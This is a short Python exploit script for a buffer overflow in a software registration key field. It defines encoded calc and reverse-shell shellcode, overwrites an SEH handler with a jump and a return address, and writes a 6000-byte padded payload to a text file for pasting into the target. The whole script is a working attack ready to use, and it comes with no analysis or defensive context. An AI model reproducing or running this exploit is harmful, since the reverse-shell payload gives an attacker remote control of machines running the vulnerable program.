


filename="bruhHacker.txt"

# registration key buffer overflow vulnerability

calc=("\xdb\xcb\xba\x6f\x25\xcf\x60\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x30\x83\xef\xfc\x31\x57\x14\x03\x57\x7b\xc7\x3a\x9c\x6b\x85"
"\xc5\x5d\x6b\xea\x4c\xb8\x5a\x2a\x2a\xc8\xcc\x9a\x38\x9c\xe0"
"\x51\x6c\x35\x73\x17\xb9\x3a\x34\x92\x9f\x75\xc5\x8f\xdc\x14"
"\x45\xd2\x30\xf7\x74\x1d\x45\xf6\xb1\x40\xa4\xaa\x6a\x0e\x1b"
"\x5b\x1f\x5a\xa0\xd0\x53\x4a\xa0\x05\x23\x6d\x81\x9b\x38\x34"
"\x01\x1d\xed\x4c\x08\x05\xf2\x69\xc2\xbe\xc0\x06\xd5\x16\x19"
"\xe6\x7a\x57\x96\x15\x82\x9f\x10\xc6\xf1\xe9\x63\x7b\x02\x2e"
"\x1e\xa7\x87\xb5\xb8\x2c\x3f\x12\x39\xe0\xa6\xd1\x35\x4d\xac"
"\xbe\x59\x50\x61\xb5\x65\xd9\x84\x1a\xec\x99\xa2\xbe\xb5\x7a"
"\xca\xe7\x13\x2c\xf3\xf8\xfc\x91\x51\x72\x10\xc5\xeb\xd9\x7e"
"\x18\x79\x64\xcc\x1a\x81\x67\x60\x73\xb0\xec\xef\x04\x4d\x27"
"\x54\xfa\x07\x6a\xfc\x93\xc1\xfe\xbd\xf9\xf1\xd4\x81\x07\x72"
"\xdd\x79\xfc\x6a\x94\x7c\xb8\x2c\x44\x0c\xd1\xd8\x6a\xa3\xd2"
"\xc8\x08\x22\x41\x90\xce")

reverse_shell=("\xdb\xdb\xbf\xbd\x95\x98\xd7\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x7b\x17\x83\xeb\xfc\x03\xc6\x86\x7a\x22\xc4\x41\xf8"
"\xcd\x34\x92\x9d\x44\xd1\xa3\x9d\x33\x92\x94\x2d\x37\xf6\x18"
"\xc5\x15\xe2\xab\xab\xb1\x05\x1b\x01\xe4\x28\x9c\x3a\xd4\x2b"
"\x1e\x41\x09\x8b\x1f\x8a\x5c\xca\x58\xf7\xad\x9e\x31\x73\x03"
"\x0e\x35\xc9\x98\xa5\x05\xdf\x98\x5a\xdd\xde\x89\xcd\x55\xb9"
"\x09\xec\xba\xb1\x03\xf6\xdf\xfc\xda\x8d\x14\x8a\xdc\x47\x65"
"\x73\x72\xa6\x49\x86\x8a\xef\x6e\x79\xf9\x19\x8d\x04\xfa\xde"
"\xef\xd2\x8f\xc4\x48\x90\x28\x20\x68\x75\xae\xa3\x66\x32\xa4"
"\xeb\x6a\xc5\x69\x80\x97\x4e\x8c\x46\x1e\x14\xab\x42\x7a\xce"
"\xd2\xd3\x26\xa1\xeb\x03\x89\x1e\x4e\x48\x24\x4a\xe3\x13\x21"
"\xbf\xce\xab\xb1\xd7\x59\xd8\x83\x78\xf2\x76\xa8\xf1\xdc\x81"
"\xcf\x2b\x98\x1d\x2e\xd4\xd9\x34\xf5\x80\x89\x2e\xdc\xa8\x41"
"\xae\xe1\x7c\xc5\xfe\x4d\x2f\xa6\xae\x2d\x9f\x4e\xa4\xa1\xc0"
"\x6f\xc7\x6b\x69\x05\x32\xfc\x56\x72\x3d\xf4\x3e\x81\x3d\x01"
"\x86\x0c\xdb\x63\xe8\x58\x74\x1c\x91\xc0\x0e\xbd\x5e\xdf\x6b"
"\xfd\xd5\xec\x8c\xb0\x1d\x98\x9e\x25\xee\xd7\xfc\xe0\xf1\xcd"
"\x68\x6e\x63\x8a\x68\xf9\x98\x05\x3f\xae\x6f\x5c\xd5\x42\xc9"
"\xf6\xcb\x9e\x8f\x31\x4f\x45\x6c\xbf\x4e\x08\xc8\x9b\x40\xd4"
"\xd1\xa7\x34\x88\x87\x71\xe2\x6e\x7e\x30\x5c\x39\x2d\x9a\x08"
"\xbc\x1d\x1d\x4e\xc1\x4b\xeb\xae\x70\x22\xaa\xd1\xbd\xa2\x3a"
"\xaa\xa3\x52\xc4\x61\x60\x62\x8f\x2b\xc1\xeb\x56\xbe\x53\x76"
"\x69\x15\x97\x8f\xea\x9f\x68\x74\xf2\xea\x6d\x30\xb4\x07\x1c"
"\x29\x51\x27\xb3\x4a\x70")

nSeh="\x90\xeb\x0b\x90"
Seh="\x91\x33\xe0\x61"
payload="A"*4188 + nSeh + Seh + "\x90"*20 +reverse_shell +"\x90"*(6000-4196-20-len(reverse_shell))

file=open(filename,"w")
file.write(payload)
file.close()